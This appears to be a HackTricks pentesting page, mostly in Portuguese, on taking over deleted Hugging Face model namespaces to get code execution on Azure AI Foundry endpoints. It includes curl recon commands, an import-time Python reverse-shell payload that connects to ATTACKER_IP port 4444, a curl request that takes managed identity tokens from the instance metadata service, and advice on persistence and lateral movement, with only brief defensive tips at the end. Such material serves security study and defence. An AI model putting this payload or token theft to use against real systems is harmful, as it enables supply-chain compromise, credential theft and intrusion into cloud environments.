# Azure - AI Foundry Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Scenario

- Azure AI Foundry Model Catalog inclui muitos modelos da Hugging Face (HF) para implantação com um clique.
- Identificadores de modelos HF são Author/ModelName. Se um author/org da HF for deletado, qualquer pessoa pode re-registrar esse author e publicar um modelo com o mesmo ModelName no caminho legado.
- Pipelines e catálogos que puxam apenas pelo nome (sem commit pinning/integrity) irão resolver para repositórios controlados pelo atacante. Quando o Azure implanta o modelo, código do loader pode ser executado no ambiente do endpoint, concedendo RCE com as permissões desse endpoint.

Casos comuns de takeover do HF:
- Ownership deletion: o caminho antigo retorna 404 até o takeover.
- Ownership transfer: o caminho antigo responde 307 para o novo author enquanto o author antigo existe. Se o author antigo for deletado depois e re-registrado, o redirect quebra e o repositório do atacante é servido no caminho legado.

## Identifying Reusable Namespaces (HF)
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## Fluxo de Ataque de ponta a ponta contra Azure AI Foundry

1) No Catálogo de Modelos, encontre modelos HF cujos autores originais foram excluídos ou transferidos (autor antigo removido) no HF.  
2) Re-registre o autor abandonado no HF e recrie o ModelName.  
3) Publique um repositório malicioso com código loader que é executado na importação ou requer trust_remote_code=True.  
4) Implemente o Author/ModelName legado a partir do Azure AI Foundry. A plataforma puxa o repositório do atacante; o loader executa dentro do container/VM do endpoint Azure, resultando em RCE com permissões do endpoint.

Fragmento de payload de exemplo executado na importação (apenas para demonstração):
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Notas
- Implantações do AI Foundry que integram HF tipicamente clonam e importam módulos do repo referenciados pela config do modelo (e.g., auto_map), o que pode disparar code execution. Alguns caminhos exigem trust_remote_code=True.
- O acesso geralmente corresponde às permissões do endpoint’s managed identity/service principal. Treat it as an initial access foothold for data access and lateral movement within Azure.

## Post-Exploitation Tips (Azure Endpoint)

- Enumerate environment variables and MSI endpoints for tokens:
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- Verifique o armazenamento montado, os artefatos do modelo e os serviços Azure alcançáveis com o token adquirido.
- Considere persistência deixando artefatos do modelo envenenados caso a plataforma re-puxe do HF.

## Orientações defensivas para usuários do Azure AI Foundry

- Fixe modelos por commit ao carregar do HF:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Espelhar modelos HF verificados em um registro interno confiável e implantar a partir daí.
- Escanear continuamente bases de código e defaults/docstrings/notebooks em busca de Author/ModelName hard-coded que foram deletados/transferidos; atualizar ou pin.
- Validar a existência do Author e a proveniência do modelo antes da implantação.

## Heurísticas de Reconhecimento (HTTP)

- Author deletado: página do Author 404; caminho legado do modelo 404 até takeover.
- Modelo transferido: caminho legado 307 para o novo Author enquanto o Author antigo existe; se o Author antigo for deletado e re-registrado depois, o caminho legado serve conteúdo do atacante.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Referências Cruzadas

- Veja a metodologia mais ampla e notas sobre cadeia de suprimentos:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Referências

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
